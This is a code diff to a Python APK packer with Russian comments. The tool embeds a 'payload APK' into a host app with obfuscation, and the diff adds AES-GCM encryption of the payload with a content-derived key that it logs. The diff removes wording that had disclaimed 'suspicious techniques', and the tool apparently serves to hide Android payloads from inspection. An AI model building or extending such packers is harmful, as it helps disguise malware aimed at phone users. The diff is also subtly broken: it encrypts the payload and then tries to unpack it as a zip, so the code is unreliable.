@@ -4,6 +4,9 @@ import shutil
 import subprocess
 import zipfile
 from pathlib import Path
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import hashlib
 
 logger = logging.getLogger(__name__)
 
@@ -11,8 +14,7 @@ logger = logging.getLogger(__name__)
 class APKPacker:
     """
     APK Packer - встраивает payload APK в основной APK с обфускацией
-    Не использует криптографию, динамическую загрузку или подозрительные техники
-    Просто прячет код от быстрого просмотра через обфускацию
+    Шифрует каждый APK с уникальным SHA-256 ключом
     """
     
     def __init__(self):
@@ -22,15 +24,15 @@ class APKPacker:
         self.output_dir.mkdir(parents=True, exist_ok=True)
         logger.info("APKPacker initialized")
     
-    def pack_apk(self, payload_apk_path: str) -> str:
+    def pack_apk(self, payload_apk_path: str) -> tuple[str, str]:
         """
-        Упаковывает payload APK с обфускацией
+        Упаковывает payload APK с обфускацией и шифрованием
         
         Args:
             payload_apk_path: Путь к оригинальному APK
             
         Returns:
-            Путь к упакованному APK
+            Кортеж (путь к упакованному APK, SHA-256 ключ шифрования)
         """
         logger.info(f"Packing APK: {payload_apk_path}")
         
@@ -40,9 +42,23 @@ class APKPacker:
             shutil.rmtree(work_dir)
         work_dir.mkdir(parents=True)
         
+        # Читаем оригинальный APK
+        with open(payload_apk_path, 'rb') as f:
+            apk_data = f.read()
+        
+        # Генерируем SHA-256 ключ из содержимого APK
+        encryption_key = hashlib.sha256(apk_data).digest()
+        encryption_key_hex = encryption_key.hex()
+        logger.info(f"Generated encryption key: {encryption_key_hex}")
+        
+        # Шифруем APK
+        encrypted_data = self.encrypt_apk(apk_data, encryption_key)
+        logger.info(f"APK encrypted: {len(apk_data)} -> {len(encrypted_data)} bytes")
+        
         # Копируем payload в рабочую директорию
         payload_copy = work_dir / "payload.apk"
-        shutil.copy(payload_apk_path, payload_copy)
+        with open(payload_copy, 'wb') as f:
+            f.write(encrypted_data)
         
         # Распаковываем payload
         payload_dir = work_dir / "payload"
@@ -55,7 +71,21 @@ class APKPacker:
         packed_apk = self.repack_apk(payload_dir, Path(payload_apk_path).stem)
         
         logger.info(f"Packed APK ready: {packed_apk}")
-        return packed_apk
+        return packed_apk, encryption_key_hex
+    
+    def encrypt_apk(self, apk_data: bytes, encryption_key: bytes) -> bytes:
+        """Шифрует APK с использованием AES-256-GCM"""
+        # Генерируем случайный nonce
+        nonce = get_random_bytes(12)
+        
+        # Создаем cipher
+        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
+        
+        # Шифруем данные
+        ciphertext, tag = cipher.encrypt_and_digest(apk_data)
+        
+        # Возвращаем nonce + tag + ciphertext
+        return nonce + tag + ciphertext
     
     def unpack_apk(self, apk_path: str, output_dir: Path):
         """Распаковывает APK"""
